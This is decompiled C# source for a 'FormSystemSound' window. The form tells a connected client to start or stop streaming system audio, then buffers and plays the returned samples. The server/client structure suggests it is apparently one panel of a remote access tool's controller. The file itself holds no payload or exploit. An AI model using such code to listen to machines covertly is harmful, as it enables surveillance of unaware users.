using System;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using NAudio.Wave;
using NAudio.Wave.SampleProviders;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000BD RID: 189
	public partial class FormSystemSound : FormMaterial
	{
		// Token: 0x0600061D RID: 1565 RVA: 0x00059A07 File Offset: 0x00057C07
		public FormSystemSound()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x0600061E RID: 1566 RVA: 0x00059A27 File Offset: 0x00057C27
		private void FormSystemSound_Load(object sender, EventArgs e)
		{
			this.timer1.Start();
		}

		// Token: 0x0600061F RID: 1567 RVA: 0x00059A34 File Offset: 0x00057C34
		private void Closing1(object sender, EventArgs e)
		{
			if (this.waveOut != null)
			{
				this.waveOut.Stop();
				this.waveOut.Dispose();
			}
			if (this.bufferedWaveProvider != null)
			{
				this.bufferedWaveProvider = null;
			}
			if (this.client != null)
			{
				this.client.Disconnect();
			}
		}

		// Token: 0x06000620 RID: 1568 RVA: 0x00059A84 File Offset: 0x00057C84
		private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.materialSwitch1.Checked)
			{
				this.bufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(48000, 16, 2));
				this.bufferedWaveProvider.DiscardOnBufferOverflow = true;
				this.client.Send(LEB128.Write(new object[]
				{
					"Start"
				}));
				this.volumeSampleProvider = new VolumeSampleProvider(this.bufferedWaveProvider.ToSampleProvider());
				this.volumeSampleProvider.Volume = (float)this.trackBar1.Value / 100f;
				this.waveOut = new WaveOut();
				this.waveOut.Volume = 1f;
				this.waveOut.Init(this.volumeSampleProvider, false);
				this.waveOut.Play();
				return;
			}
			if (this.waveOut != null)
			{
				this.waveOut.Stop();
				this.waveOut.Dispose();
			}
			if (this.bufferedWaveProvider != null)
			{
				this.bufferedWaveProvider = null;
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Stop"
			}));
		}

		// Token: 0x06000621 RID: 1569 RVA: 0x00059B9A File Offset: 0x00057D9A
		private void trackBar1_Scroll(object sender, EventArgs e)
		{
			if (!this.materialSwitch1.Checked)
			{
				return;
			}
			this.volumeSampleProvider.Volume = (float)this.trackBar1.Value / 10f;
		}

		// Token: 0x06000622 RID: 1570 RVA: 0x00059BC7 File Offset: 0x00057DC7
		public void Buffer(byte[] e)
		{
			if (this.waveOut != null)
			{
				this.bufferedWaveProvider.AddSamples(e, 0, e.Count<byte>());
			}
		}

		// Token: 0x06000623 RID: 1571 RVA: 0x00059BE4 File Offset: 0x00057DE4
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (!this.parrent.itsConnect)
			{
				base.Close();
			}
			if (this.client != null && !this.client.itsConnect)
			{
				base.Close();
			}
		}

		// Token: 0x040004F0 RID: 1264
		public WaveOut waveOut;

		// Token: 0x040004F1 RID: 1265
		public BufferedWaveProvider bufferedWaveProvider;

		// Token: 0x040004F2 RID: 1266
		public VolumeSampleProvider volumeSampleProvider;

		// Token: 0x040004F3 RID: 1267
		public Clients client;

		// Token: 0x040004F4 RID: 1268
		public Clients parrent;
	}
}
